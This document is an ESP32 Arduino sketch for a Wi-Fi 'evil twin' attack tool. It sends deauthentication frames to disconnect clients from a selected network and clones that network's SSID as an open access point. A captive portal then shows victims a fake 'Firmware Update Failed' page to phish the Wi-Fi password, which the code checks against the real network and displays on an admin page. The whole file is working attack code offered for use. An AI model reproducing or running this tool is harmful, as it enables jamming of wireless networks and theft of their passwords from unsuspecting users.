#include <Arduino.h>
#include "esp_wifi.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Define the LED pin
const int ledPin = 2;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi; // Store RSSI value
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

// Declare previousStationCount as a global variable
int previousStationCount = 0;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = R"(
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f4f9;
      color: #333;
      margin: 0;
      padding: 0;
      opacity: 0;
      animation: fadeIn 1s ease-in forwards;
    }
    @keyframes fadeIn {
      to {
        opacity: 1;
      }
    }
    .nav {
      background: #007BFF;
      color: #fff;
      padding: 1.5em;
      text-align: center;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    .content {
      max-width: 600px;
      margin: 2em auto;
      padding: 2em;
      background: #fff;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      opacity: 0;
      transform: translateY(20px);
      animation: slideUp 0.5s ease-out 0.5s forwards;
    }
    @keyframes slideUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    h1 {
      font-size: 2em;
      color: #555;
      margin-bottom: 1em;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1em;
    }
    label {
      font-weight: bold;
      margin-bottom: 0.5em;
    }
    input[type="password"] {
      padding: 0.8em;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 1em;
      transition: border-color 0.3s;
    }
    input[type="password"]:focus {
      border-color: #007BFF;
      outline: none;
    }
    input[type="submit"] {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 0.8em;
      border-radius: 5px;
      font-size: 1em;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    input[type="submit"]:hover {
      background-color: #0056b3;
    }
    .footer {
      text-align: center;
      margin-top: 2em;
      color: #777;
    }
    .signal {
      display: inline-block;
      width: 100px;
      height: 20px;
      background: #eee;
      border-radius: 5px;
      overflow: hidden;
      margin-left: 10px;
    }
    .signal-bar {
      height: 100%;
      width: 0;
      background: #007BFF;
      transition: width 0.5s ease-out;
    }
    .progress-bar {
      width: 100%;
      height: 10px;
      background: #eee;
      border-radius: 5px;
      overflow: hidden;
      margin-top: 1em;
    }
    .progress-bar-fill {
      height: 100%;
      width: 0;
      background: #007BFF;
      transition: width 0.5s ease-out;
    }
  )";

  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><div class='nav'><b>" + a + "</b> " + SUBTITLE + "</div><div class='content'><h1>" + t + "</h1>";
  return h;
}

String footer() {
  return R"(
    </div>
    <div class='footer'>
      &#169; All rights reserved.
    </div>
    <script>
      // Update signal strength bars
      function updateSignalStrength() {
        const signals = document.querySelectorAll('.signal-bar');
        signals.forEach((bar, index) => {
          const strength = )" + String(WiFi.RSSI()) + R"(;
          const percentage = ((strength + 100) / 40) * 100;
          bar.style.width = Math.min(100, Math.max(0, percentage)) + '%';
        });
      }

      // Animate progress bar
      function animateProgressBar() {
        const progressBar = document.querySelector('.progress-bar-fill');
        let width = 0;
        const interval = setInterval(() => {
          if (width >= 100) {
            clearInterval(interval);
          } else {
            width++;
            progressBar.style.width = width + '%';
          }
        }, 20);
      }

      // Initial signal strength update
      updateSignalStrength();
      setInterval(updateSignalStrength, 2000);

      // Animate progress bar on form submission
      document.querySelector('form').addEventListener('submit', (e) => {
        e.preventDefault();
        animateProgressBar();
        setTimeout(() => {
          e.target.submit();
        }, 2000); // Simulate a delay for the progress bar animation
      });
    </script>
  </body>
  </html>
  )";
}

String index() {
  return header(TITLE) +
         "<div>" + BODY + "</div>"
         "<form action='/' method='post'>"
         "<label for='password'>WiFi Password:</label>"
         "<input type='password' id='password' name='password' minlength='8' required>"
         "<input type='submit' value='Continue'>"
         "<div class='progress-bar'><div class='progress-bar-fill'></div></div>"
         "</form>" + footer();
}

void setup() {
  Serial.begin(115200);

  // Initialize the LED pin
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);

  // Initialize Wi-Fi in AP+STA mode
  WiFi.mode(WIFI_AP_STA);

  // Configure the soft AP
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_34732", "d347h320");

  // Start the DNS server
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  // Initialize Wi-Fi with default configuration
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);

  // Set Wi-Fi mode to STA (Station mode)
  esp_wifi_set_mode(WIFI_MODE_APSTA);

  // Start Wi-Fi
  esp_wifi_start();

  // Set up the web server
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      network.rssi = WiFi.RSSI(i); // Store RSSI value
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><span style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</span><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    Serial.println("Good password was entered!");
    Serial.println(_correct);

    // Firmware update animation
    String response = R"(
      <html>
      <head>
        <meta name='viewport' content='initial-scale=1.0, width=device-width'>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
          }
          h2 {
            font-size: 2em;
            color: #007BFF;
            margin-bottom: 1em;
          }
          .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #007BFF;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 1em;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .progress-bar {
            width: 300px;
            height: 20px;
            background: #eee;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 1em;
          }
          .progress-bar-fill {
            height: 100%;
            width: 0;
            background: #007BFF;
            transition: width 2s ease-out;
          }
        </style>
        <script>
          // Simulate firmware update progress
          function simulateUpdate() {
            const progressBar = document.querySelector('.progress-bar-fill');
            let width = 0;
            const interval = setInterval(() => {
              if (width >= 100) {
                clearInterval(interval);
                // Redirect to the password verified page after completion
                setTimeout(() => {
                  window.location.href = '/password-verified';
                }, 1000);
              } else {
                width++;
                progressBar.style.width = width + '%';
              }
            }, 20);
          }
          // Start the simulation when the page loads
          window.onload = simulateUpdate;
        </script>
      </head>
      <body>
        <h2>Firmware Update in Progress</h2>
        <div class="loader"></div>
        <div class="progress-bar">
          <div class="progress-bar-fill"></div>
        </div>
      </body>
      </html>
    )";
    webServer.send(200, "text/html", response);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?refresh=true'>"
                   "<button style='display:inline-block;'>Refresh List</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Select</th></tr>";
                   
void handleIndex() {
  // Check if the refresh button was clicked
  if (webServer.hasArg("refresh") && webServer.arg("refresh") == "true") {
    performScan(); // Perform a new scan
  }

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      // Start deauthentication for the selected network
      sendDeauthPacket();
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Wirelessnet", "hackme");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (!hotspot_active) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td><div class='signal'><div class='signal-bar' id='signal-" + String(i) + "'></div></div></td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div>" + footer();
    webServer.send(200, "text/html", _html);

  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      // Blink the LED when password is entered
      for (int i = 0; i < 18; i++) {
        digitalWrite(ledPin, HIGH);
        delay(200);
        digitalWrite(ledPin, LOW);
        delay(200);
      }
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(2000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td><div class='signal'><div class='signal-bar' id='signal-" + String(i) + "'></div></div></td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }

  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div>" + footer();
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Check for new clients connecting to the AP
  int currentStationCount = WiFi.softAPgetStationNum();
  if (currentStationCount > previousStationCount) {
    // A new client has connected
    blinkLED();
    previousStationCount = currentStationCount;
  } else if (currentStationCount < previousStationCount) {
    // A client has disconnected
    previousStationCount = currentStationCount;
  }

  if (deauthing_active && millis() - deauth_now >= 1000) {
    int channel = _selectedNetwork.ch;
    if (channel >= 1 && channel <= 13) {
      WiFi.setChannel(channel);
    }

    // Call the function to send the deauthentication packet
    sendDeauthPacket();

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
void sendDeauthPacket() {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x01, 0x00
  };

  // Copy the BSSID of the selected network into the deauthentication packet
  memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
  memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
  deauthPacket[24] = 1; // Reason code (1 = Unspecified reason)

  // Send the deauthentication packet
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

  // Log the packet
  Serial.println("Deauthentication packet sent to: " + bytesToStr(_selectedNetwork.bssid, 6));
}

void blinkLED() {
  for (int i = 0; i < 5; i++) {
    digitalWrite(ledPin, HIGH);
    delay(200);
    digitalWrite(ledPin, LOW);
    delay(200);
  }
}
